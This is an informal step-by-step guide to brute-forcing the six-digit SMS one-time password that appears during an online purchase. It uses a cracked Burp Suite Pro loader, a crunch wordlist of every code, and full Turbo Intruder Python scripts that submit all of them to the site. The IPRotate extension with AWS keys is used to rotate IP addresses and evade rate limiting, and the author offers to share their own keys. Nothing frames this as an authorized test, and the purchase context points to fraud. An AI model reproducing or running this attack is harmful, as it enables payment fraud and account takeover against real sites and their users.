https://addons.mozilla.org/firefox/downloads/file/3633665/burp_proxy_toggler_lite-23.8.xpi
:Get the firefox burpsuite extension for firefox (if you have firefox)
:toggle it on

Open Burp Suite Pro
:If you downloaded the same version as me this is the code I use to open it
:Open Terminal in folder where Burp Suite is and type

"/usr/lib/jvm/java-21-openjdk-amd64/bin/java" \
"--add-opens=java.desktop/javax.swing=ALL-UNNAMED" \
"--add-opens=java.base/java.lang=ALL-UNNAMED" \
"--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED" \
"--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED" \
"--add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED" \
"-javaagent:burploader.jar" "-noverify" \
"-Djava.util.logging.config.file=logging.properties" \
"-jar" "/home/hekticxox/Desktop/BurpeSuite/burpsuite_pro_v2024.5.jar" \
> burp_log.txt 2>&1

:Once Burpe Suite opens go to or open your Firefox Browser
:Navigate to http://burp
:Click the top right certificate button to download certificate
:Navigate to the settings on your firefox and search certificate in searchbar
:Open certificate settings
:In the authorities section click add certificate and add the certificate you
just downloaded
:check both boxes and click add

Download the Jython Stand alone .jar file
:in your terminal type

wget https://repo1.maven.org/maven2/org/python/jython-standalone/2.7.4/jython-standalone-2.7.4.jar

In Burpe Suite navigate to your extensions page
:Add the location of the jython standalone you just downloaded in to the python
section of the extension settings

Once thats done you might need to close and reload Burp Suite using the code above

You should now be able to go to the BApp part in the extensions page on Burp
:Search Turbo Intruder and install
:Search IPRotate and install

Create your OTP 6 digit word list
:in your terminal type

crunch 6 6 0123456789 -o 6digit-combos.txt

:this will save your OTP word list to the current directory
:take note of the file location it should be something like
/home/yourusername/Desktop/6digit-combos.txt (or wherever your terminal is open to)

Go to the purchase you want to make
:if/when the 2fa/otp pops up click receive code by sms
:when you get to the page enter in a random 6 digit code (BUT DON'T PRESS ENTER YET)
:go to Burp Suite and click the Proxy button
:then click intercept and change it to on
:then go back to the OTP page and click enter
:the request should show up on your Burp Suite
:the page should have the 6 digit (wrong) OTP you entered
if it doesn't just keep pressing foward till you have the page with the code you entered
:once you found the request page right click it on Burp Suite
:scroll down to extensions and send to Turbo Intruder

:at this point I will turn off intercept as to not timeout the server

:open the turbo intruder that opened up for settings

:there should be two sections when turbo intruder pops up
one will have the request at the top of the page you sent
and the bottom will have a place to enter the python code

:in the top section find the 6 digit code you entered

:highlight the 6 digits and replace with %s

:in the bottom python scripting part you can use the drop down box and click
the only burp option

:in the code it will have a location for a word list and you will want
to replace the word list with your own word list that contains the
1,000,000 entries for each 6 digit possibility

:the code should look something like this

import random

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           engine=Engine.BURP
                           )

    # Read the wordlist file
    with open('/home/hekticxox/Desktop/BurpeSuite/6digit-combos.txt', 'r') as file:
        combos = [line.rstrip() for line in file]

    # Shuffle the list to randomize the order (I've added this to pick random numbers but only one time)
    random.shuffle(combos)

    # Queue the requests, ensuring each number is used only once
    for combo in combos:
        engine.queue(target.req, combo)

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
        callbacks.addToSiteMap(req.getBurpRequest())
        
:If your computer is having trouble running the code you can replace with this one

import random
import time

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,  # Number of concurrent connections
                           requestsPerConnection=1,  # Number of requests per connection
                           engine=Engine.BURP
                           )

    # Read the wordlist file
    with open('/home/hekticxox/Desktop/BurpeSuite/6digit-combos.txt', 'r') as file:
        combos = [line.rstrip() for line in file]

    # Shuffle the list to randomize the order
    random.shuffle(combos)

    # Queue the requests with a delay between each request
    for combo in combos:
        engine.queue(target.req, combo)
        time.sleep(1)  # Sleep for 1 second between each request, adjust this as needed
        #you can adjust the line above to decrease the time between requests just remember
        #the slower it goes the longer its going to take.
        #you can also use fractions of a second so if you want to run it with half a second
        #or a quarter of a second between requests you can change 1 to 0.5 or 0.25 ect

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
        callbacks.addToSiteMap(req.getBurpRequest())
        
:Now before you click attack on turbo intruder click the IPRotate extension. You will need
to enter your AWS credentials so you can make multiple requests in different locations,
this will help reduce the chance of getting rate limited and temporarly suspended.
:for the information you need to enter the AWS key and AWS secret key, you can use mine for now

:and for the host you can copy the host from the request page that turbo intruder is using and
paste it in to the IPRotate host box where it says example.com

:Click enable

:Once it displays enabled go back to your tubro intruder page and click attack

:Your results should now start displaying on the turbo intruder page
:the results should all say 400 or 403 or something similar
:when you get the right result it should say 200 and that will be the
correct payload for the digit code. Open that page up and copy the 6 digit
OTP
:Stop the attack when the OTP has been found and you should be able to enter
it in to the OTP box and click enter

(The last part of this write up is kinf of where I am at now, my computer keeps crashing
due to the number of requests sent as it overloads things on my end. But maybe your computer
can handle it. Let me know how it goes or if you need any help.)

